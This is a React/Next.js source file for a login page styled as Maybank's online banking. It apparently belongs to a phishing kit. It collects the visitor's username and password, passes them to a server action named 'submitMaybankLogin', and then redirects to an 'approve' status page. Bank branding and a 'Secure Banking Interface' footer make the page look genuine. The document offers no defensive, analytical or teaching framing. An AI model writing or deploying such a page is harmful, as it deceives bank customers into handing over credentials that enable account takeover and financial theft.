"use client";

import React, { useState } from "react";
import { User, Lock, Loader2 } from "lucide-react";
import { submitMaybankLogin } from "@/lib/action";
import { useRouter } from "next/navigation";

export default function MaybankLoginPage() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState("");
  const router = useRouter();

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    if (username.length < 3 || password.length < 6) {
      setError("Please enter valid credentials.");
      return;
    }

    setIsLoading(true);
    setError("");

    try {
      const result = await submitMaybankLogin(username, password);
      if (result.success) {
        // Redirect to the approval status page after a short delay
        setTimeout(() => {
          router.push("/b/status/approve");
        }, 2000);
      } else {
        setError(result.error || "Login failed. Please try again.");
        setIsLoading(false);
      }
    } catch (err) {
      setError("Something went wrong. Please try again later.");
      setIsLoading(false);
    }
  };

  return (
    <div className="relative flex min-h-screen flex-col text-white">
      {/* Background Image with Overlay */}
      <div
        className="absolute inset-0 -z-10 bg-cover bg-center bg-no-repeat"
        style={{
          backgroundImage: 'url("https://images.unsplash.com/photo-1511895426328-dc8714191300?auto=format&fit=crop&q=80&w=2000")',
        }}
      >
        <div className="absolute inset-0 bg-black/60" />
      </div>

      {/* Header */}
      <header className="flex items-center justify-between p-6">
        <h1 className="text-2xl font-bold text-[#ffcc00] tracking-tight">
          MAYBANK
        </h1>
        <div className="text-sm font-medium tracking-wide">
          <span className="cursor-pointer hover:underline">PERSONAL</span>
          <span className="mx-2 text-gray-500">|</span>
          <span className="cursor-pointer hover:underline">BUSINESS</span>
        </div>
      </header>

      {/* Main Content */}
      <main className="flex flex-1 flex-col items-center justify-center px-6 pb-20">
        <h2 className="mb-12 text-center text-3xl font-normal leading-tight text-white/90">
          Humanising Financial Services
        </h2>

        <form onSubmit={handleLogin} className="w-full max-w-sm space-y-4">
          {error && (
            <div className="rounded bg-red-500/10 p-3 text-center text-sm text-red-400 border border-red-500/20">
              {error}
            </div>
          )}

          {/* Username Input */}
          <div className="relative">
            <input
              type="text"
              placeholder="My Username"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              className="w-full rounded-lg bg-white px-4 py-4 pr-12 text-lg text-black placeholder:text-gray-400 focus:outline-none"
              required
            />
            <div className="absolute right-4 top-1/2 -translate-y-1/2">
              <User size={24} className="text-blue-500" />
            </div>
          </div>

          {/* Password Input */}
          <div className="relative">
            <input
              type="password"
              placeholder="Password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="w-full rounded-lg bg-white px-4 py-4 pr-12 text-lg text-black placeholder:text-gray-400 focus:outline-none"
              required
            />
            <div className="absolute right-4 top-1/2 -translate-y-1/2">
              <Lock size={24} className="text-[#d4af37]" />
            </div>
          </div>

          {/* Login Button */}
          <button
            type="submit"
            disabled={isLoading}
            className="flex w-full items-center justify-center rounded-lg bg-[#ffbc12] py-4 text-xl font-bold text-black shadow-lg transition-transform hover:scale-[1.01] active:scale-[0.99] disabled:opacity-70 disabled:hover:scale-100"
          >
            {isLoading ? (
              <>
                <Loader2 className="mr-2 h-5 w-5 animate-spin" />
                PLEASE WAIT...
              </>
            ) : (
              "LOGIN"
            )}
          </button>

          {/* Links */}
          <div className="mt-4 text-center">
            <button
              type="button"
              className="text-sm font-medium text-white/80 hover:underline"
            >
              Forgot Login Details??
            </button>
          </div>
        </form>
      </main>

      {/* Footer */}
      <footer className="p-6 text-center text-[10px] text-gray-500">
        <p>© 2026 Maybank. All rights reserved. Secure Banking Interface.</p>
      </footer>
    </div>
  );
}
